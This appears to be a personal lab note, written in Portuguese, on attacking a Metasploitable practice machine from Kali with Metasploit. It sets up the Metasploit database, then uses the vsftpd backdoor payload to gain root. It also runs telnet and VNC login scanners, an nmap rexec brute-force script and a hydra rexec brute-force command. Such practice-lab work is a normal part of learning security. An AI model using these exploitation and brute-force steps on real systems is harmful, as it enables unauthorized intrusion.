 Conectando no Bd (Parte mais chata)

sudo apt install postgresql postgresql-contrib &&
sudo service postgresql start

msfdb init
----
msfconsole
db_connect msf:msf@127.0.0.1:5432/msf

![image](https://github.com/user-attachments/assets/4fd6c1bb-7046-475b-aa98-4870ef157d5e)

![image](https://github.com/user-attachments/assets/a7e1a171-b54a-4cfa-b625-edcb3abb0ada)

![image](https://github.com/user-attachments/assets/5f82ab13-8c53-4ac1-bfc4-88fe7959647e)

![image](https://github.com/user-attachments/assets/967ec4b6-3d7a-4357-9a10-85016a8a83cc)

Depois de conseguir acesso como root usando o payload de:
CRTL + Z ;
Y ;

sessions
para acessar a sessao ;
sessions -i 2 ;

![image](https://github.com/user-attachments/assets/e4c0a2cc-9ec0-4e06-9f0f-3e3448ace42d)


```bash
meu ip: 177.67.136.88
ip kali: 172.24.49.254
ip meta : 192.168.100.102

PAYLOAD cmd/unix/interact = vsft 3.2.4
PAYLOAD auxiliary/scanner/telnet/telnet_login = telnet 23

PAYLOAD scanner/vnc/vnc_login = VNC  ~~~ depois entrar com vncviewer 192.168.100.102:5900 :password

nmap -p 512 --script rexec-brute -v 192.168.100.102 ~~~~ pesquisar rexec_login e usar uns dos logins

┌──(luan㉿192.168.100.102)-[~/Desktop/porta_512_logins]
└─$ hydra -L /home/luan/Desktop/porta_512_logins/usuarios_512.txt -P /home/luan/Desktop/porta_512_logins/passwd_512.txt -vV 192.168.100.102 rexec

``` 
